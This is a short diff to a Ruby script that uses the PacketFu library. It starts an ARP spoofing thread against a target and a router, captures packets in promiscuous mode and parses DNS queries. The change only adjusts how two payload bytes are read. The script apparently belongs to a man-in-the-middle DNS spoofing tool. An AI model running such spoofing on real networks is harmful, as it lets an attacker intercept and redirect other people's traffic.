@@ -130,6 +130,8 @@ begin
 	puts "Initiating ARP thread..."
 	arp_spoof_thread = Thread.new{spoofThread(@arp_packet_target, @arp_packet_router)}
 
+
+
 	capture = PacketFu::Capture.new(:iface => @interface, 
 					:start => true, 
 					:promisc => true, 
@@ -141,7 +143,7 @@ begin
 	puts "Captured packet"
 
 		@packet = PacketFu::Packet.parse(packet)
-		dnsQuery = @packet.payload[2].unpack('h*')[0].chr + @packet.payload[3].unpack('h*')[0].chr
+		dnsQuery = @packet.payload[2].to_s + @packet.payload[3].to_s
 		if dnsQuery == '10'
 			@domain = getDomain(@packet.payload[12..-1])
 			if @domain.nil?
